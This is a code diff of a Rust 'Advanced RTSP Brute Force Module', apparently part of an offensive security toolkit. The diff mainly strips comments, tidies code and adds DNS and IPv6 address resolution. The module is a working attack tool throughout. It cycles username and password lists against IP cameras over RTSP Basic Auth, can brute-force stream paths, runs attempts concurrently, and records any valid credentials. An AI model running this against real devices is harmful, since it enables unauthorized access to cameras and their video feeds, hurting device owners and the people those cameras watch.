@@ -1,6 +1,6 @@
 use anyhow::{anyhow, Result};
-use base64::Engine as _;
 use base64::engine::general_purpose::STANDARD as Base64;
+use base64::Engine as _;
 use std::{
     fs::File,
     io::{BufRead, BufReader, Write},
@@ -20,9 +20,6 @@ pub async fn run(target: &str) -> Result<()> {
     println!("=== Advanced RTSP Brute Force Module ===");
     println!("[*] Target: {}", target);
 
-    //------------------------------
-    // 1) Basic Brute Force Settings
-    //------------------------------
     let port: u16 = loop {
         let input = prompt_default("RTSP Port", "554")?;
         match input.parse() {
@@ -52,18 +49,11 @@ pub async fn run(target: &str) -> Result<()> {
     let verbose = prompt_yes_no("Verbose mode?", false)?;
     let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;
 
-    //------------------------------
-    // 2) Advanced Features
-    //------------------------------
     let advanced_mode = prompt_yes_no("Use advanced RTSP commands/headers (DESCRIBE + custom headers)?", false)?;
     let mut advanced_headers: Vec<String> = Vec::new();
     let advanced_command = if advanced_mode {
-        // By default, we'll demonstrate a DESCRIBE method.
-        // You could prompt for multiple commands, but here's one for simplicity.
         let method = prompt_default("RTSP method to use (e.g. DESCRIBE)", "DESCRIBE")?;
-        // Prompt for custom headers file
-        let headers_file = prompt_yes_no("Load extra RTSP headers from a file?", false)?;
-        if headers_file {
+        if prompt_yes_no("Load extra RTSP headers from a file?", false)? {
             let headers_path = prompt_required("Path to RTSP headers file")?;
             advanced_headers = load_lines(&headers_path)?;
         }
@@ -72,77 +62,56 @@ pub async fn run(target: &str) -> Result<()> {
         None
     };
 
-    //------------------------------
-    // 3) Brute Force RTSP Paths
-    //------------------------------
     let brute_force_paths = prompt_yes_no("Brute force possible RTSP paths (e.g. /stream /live)?", false)?;
     let paths = if brute_force_paths {
         let paths_file = prompt_required("Path to RTSP paths file")?;
         load_lines(&paths_file)?
     } else {
-        // If not brute forcing paths, we just do an empty vector or single slash
-        vec!["".to_string()]  // We'll interpret "" as no path specified
+        vec!["".to_string()]
     };
 
-    //------------------------------
-    // 4) Begin Brute Force
-    //------------------------------
     let addr = format!("{}:{}", target, port);
     let found = Arc::new(Mutex::new(Vec::new()));
     let stop = Arc::new(Mutex::new(false));
 
     println!("\n[*] Starting brute-force on {}", addr);
 
-    // Load user list
     let users = load_lines(&usernames_file)?;
-
-    // Load password list
-    let pass_file = File::open(&passwords_file)?;
-    let pass_buf = BufReader::new(pass_file);
-    let pass_lines: Vec<_> = pass_buf.lines().filter_map(Result::ok).collect();
+    let pass_lines: Vec<_> = BufReader::new(File::open(&passwords_file)?)
+        .lines()
+        .filter_map(Result::ok)
+        .collect();
 
     let mut idx = 0;
-    // For each password
     for pass in pass_lines {
-        // If we've already found valid creds and we're stopping on success, break early
         if *stop.lock().await {
             break;
         }
 
-        // If combo_mode is true, each password tries all users.
-        // Otherwise, line up each user with the “idx” (like a parallel dictionary).
         let userlist = if combo_mode {
             users.clone()
         } else {
-            // Use user at "idx % users.len()" if we’re not in combo_mode
             vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
         };
 
-        // We batch tasks up to "concurrency"
         let mut handles = vec![];
 
-        // For each username
         for user in userlist {
-            // For each path
             for path in &paths {
                 if *stop.lock().await {
                     break;
                 }
 
-                // Clone references for the task
                 let addr = addr.clone();
                 let user = user.clone();
                 let pass = pass.clone();
                 let path = path.clone();
                 let found = Arc::clone(&found);
                 let stop = Arc::clone(&stop);
-
-                // The advanced method & headers
                 let command = advanced_command.clone();
                 let headers = advanced_headers.clone();
 
                 let handle = tokio::spawn(async move {
-                    // Check again if we've been signaled to stop
                     if *stop.lock().await {
                         return;
                     }
@@ -150,29 +119,21 @@ pub async fn run(target: &str) -> Result<()> {
                     match try_rtsp_login(&addr, &user, &pass, &path, command.as_deref(), &headers).await {
                         Ok(true) => {
                             let path_str = if path.is_empty() { "NO_PATH" } else { &path };
-                            println!("[+] {} -> {}:{} [path={}]",
-                                addr, user, pass, path_str);
+                            println!("[+] {} -> {}:{} [path={}]", addr, user, pass, path_str);
                             found.lock().await.push((addr.clone(), user.clone(), pass.clone(), path_str.to_string()));
-
                             if stop_on_success {
                                 *stop.lock().await = true;
                             }
                         }
-                        Ok(false) => {
-                            log(verbose, &format!("[-] {} -> {}:{} [path={}]", addr, user, pass, path));
-                        }
-                        Err(e) => {
-                            log(verbose, &format!("[!] {} -> error: {}", addr, e));
-                        }
+                        Ok(false) => log(verbose, &format!("[-] {} -> {}:{} [path={}]", addr, user, pass, path)),
+                        Err(e) => log(verbose, &format!("[!] {} -> error: {}", addr, e)),
                     }
 
-                    // A short delay between attempts
                     sleep(Duration::from_millis(10)).await;
                 });
 
                 handles.push(handle);
 
-                // If we reach concurrency, wait for them to finish before scheduling more
                 if handles.len() >= concurrency {
                     for h in handles.drain(..) {
                         let _ = h.await;
@@ -181,7 +142,6 @@ pub async fn run(target: &str) -> Result<()> {
             }
         }
 
-        // Wait for any leftover tasks in the batch
         for h in handles {
             let _ = h.await;
         }
@@ -189,9 +149,6 @@ pub async fn run(target: &str) -> Result<()> {
         idx += 1;
     }
 
-    //------------------------------
-    // 5) Show Results / Save
-    //------------------------------
     let creds = found.lock().await;
     if creds.is_empty() {
         println!("\n[-] No credentials found (with these paths).");
@@ -214,8 +171,41 @@ pub async fn run(target: &str) -> Result<()> {
     Ok(())
 }
 
-/// Attempt to authenticate via RTSP (with optional advanced method + headers).
-/// Returns Ok(true) if successful, Ok(false) if incorrect credentials, Err(...) if we can’t connect/parse response.
+/// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
+async fn resolve_targets(addr: &str) -> Result<Vec<SocketAddr>> {
+    // 1) If it's a literal SocketAddr, return it directly
+    if let Ok(sa) = addr.parse::<SocketAddr>() {
+        return Ok(vec![sa]);
+    }
+
+    // 2) Split into host / port
+    let (host, port) = if let Some((h, p)) = addr.rsplit_once(':') {
+        (h.to_string(), p.parse().unwrap_or(554))
+    } else {
+        (addr.to_string(), 554)
+    };
+
+    // 3) Format bracketed IPv6 or plain host
+    let host_port = if host.contains(':') && !host.starts_with('[') {
+        format!("[{}]:{}", host, port)
+    } else {
+        format!("{}:{}", host, port)
+    };
+
+    // 4) DNS lookup (handles A + AAAA)
+    let addrs = tokio::net::lookup_host(host_port.clone())
+        .await
+        .map_err(|e| anyhow!("DNS lookup '{}': {}", host_port, e))?
+        .collect::<Vec<_>>();
+
+    if addrs.is_empty() {
+        Err(anyhow!("No addresses found for '{}'", host_port))
+    } else {
+        Ok(addrs)
+    }
+}
+
+/// Attempt RTSP login, trying each resolved address until one succeeds or all fail.
 async fn try_rtsp_login(
     addr: &str,
     user: &str,
@@ -224,55 +214,49 @@ async fn try_rtsp_login(
     method: Option<&str>,
     extra_headers: &[String],
 ) -> Result<bool> {
-    // Parse the address to confirm it's valid
-    let socket_addr: SocketAddr = addr.parse()
-        .map_err(|e| anyhow!("Invalid socket address '{}': {}", addr, e))?;
+    let addrs = resolve_targets(addr).await?;
+    let mut last_err = None;
+    let mut stream = None;
 
-    // Open TCP connection to camera
-    let mut stream = TcpStream::connect(socket_addr)
-        .await
-        .map_err(|e| anyhow!("Connection error: {}", e))?;
+    // Try each candidate address
+    for sa in addrs {
+        match TcpStream::connect(sa).await {
+            Ok(s) => { stream = Some(s); break; }
+            Err(e) => { last_err = Some(e); continue; }
+        }
+    }
 
-    // If the user wants advanced mode, use "method" (e.g., DESCRIBE) + headers.
-    // Otherwise, fallback to OPTIONS. We'll do "DESCRIBE" by default if method is Some("DESCRIBE").
-    let rtsp_method = method.unwrap_or("OPTIONS");
-
-    // Build path portion (some cameras expect the path in the request line).
-    // If path is empty, we skip it. Or default to / if you want.
-    let path_str = if path.is_empty() {
-        ""  // or "/"
-    } else {
-        path
+    let mut stream = match stream {
+        Some(s) => s,
+        None => {
+            return Err(anyhow!(
+                "All connection attempts failed: {}",
+                last_err.map(|e| e.to_string()).unwrap_or_default()
+            ))
+        }
     };
 
-    // Build Basic Auth
+    let rtsp_method = method.unwrap_or("OPTIONS");
+    let path_str = if path.is_empty() { "" } else { path };
     let credentials = Base64.encode(format!("{}:{}", user, pass));
 
-    // Build the RTSP request line
     let mut request = format!(
         "{method} rtsp://{addr}/{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n",
         method = rtsp_method,
         addr = addr,
-        path = path_str.trim_start_matches('/'), // avoid double slash
+        path = path_str.trim_start_matches('/'),
         auth = credentials,
     );
 
-    // Append extra headers if advanced mode is on
     for header in extra_headers {
-        // We assume each line in extra_headers is valid, e.g. "User-Agent: MyCameraClient"
         request.push_str(header);
         if !header.ends_with("\r\n") {
             request.push_str("\r\n");
         }
     }
-
-    // End with a blank line
     request.push_str("\r\n");
 
-    // Send request
     stream.write_all(request.as_bytes()).await?;
-
-    // Read response
     let mut buffer = [0u8; 2048];
     let n = stream.read(&mut buffer).await?;
     if n == 0 {
@@ -280,7 +264,6 @@ async fn try_rtsp_login(
     }
     let response = String::from_utf8_lossy(&buffer[..n]);
 
-    // Very naive checks
     if response.contains("200 OK") {
         Ok(true)
     } else if response.contains("401") || response.contains("403") {
@@ -290,7 +273,6 @@ async fn try_rtsp_login(
     }
 }
 
-/// Prompts the user for a required field (no default allowed).
 fn prompt_required(msg: &str) -> Result<String> {
     loop {
         print!("{}: ", msg);
@@ -300,27 +282,20 @@ fn prompt_required(msg: &str) -> Result<String> {
         let trimmed = s.trim();
         if !trimmed.is_empty() {
             return Ok(trimmed.to_string());
-        } else {
-            println!("This field is required.");
         }
+        println!("This field is required.");
     }
 }
 
-/// Prompts the user for a value with a default fallback.
 fn prompt_default(msg: &str, default: &str) -> Result<String> {
     print!("{} [{}]: ", msg, default);
     std::io::Write::flush(&mut std::io::stdout())?;
     let mut s = String::new();
     std::io::stdin().read_line(&mut s)?;
     let trimmed = s.trim();
-    Ok(if trimmed.is_empty() {
-        default.to_string()
-    } else {
-        trimmed.to_string()
-    })
+    Ok(if trimmed.is_empty() { default.to_string() } else { trimmed.to_string() })
 }
 
-/// Prompts the user for a yes/no question, with a default answer.
 fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
     let default = if default_yes { "y" } else { "n" };
     loop {
@@ -328,20 +303,15 @@ fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
         std::io::Write::flush(&mut std::io::stdout())?;
         let mut s = String::new();
         std::io::stdin().read_line(&mut s)?;
-        let input = s.trim().to_lowercase();
-        if input.is_empty() {
-            return Ok(default_yes);
-        } else if input == "y" || input == "yes" {
-            return Ok(true);
-        } else if input == "n" || input == "no" {
-            return Ok(false);
-        } else {
-            println!("Invalid input. Please enter 'y' or 'n'.");
+        match s.trim().to_lowercase().as_str() {
+            ""        => return Ok(default_yes),
+            "y" | "yes" => return Ok(true),
+            "n" | "no"  => return Ok(false),
+            _ => println!("Invalid input. Please enter 'y' or 'n'."),
         }
     }
 }
 
-/// Loads a file, returning non-empty lines in a Vec.
 fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
     let file = File::open(path)?;
     let reader = BufReader::new(file);
@@ -353,14 +323,12 @@ fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
         .collect())
 }
 
-/// Prints log messages only in verbose mode.
 fn log(verbose: bool, msg: &str) {
     if verbose {
         println!("{}", msg);
     }
 }
 
-/// Returns a PathBuf in the current directory for the given filename.
 fn get_filename_in_current_dir(input: &str) -> PathBuf {
     let name = Path::new(input)
         .file_name()
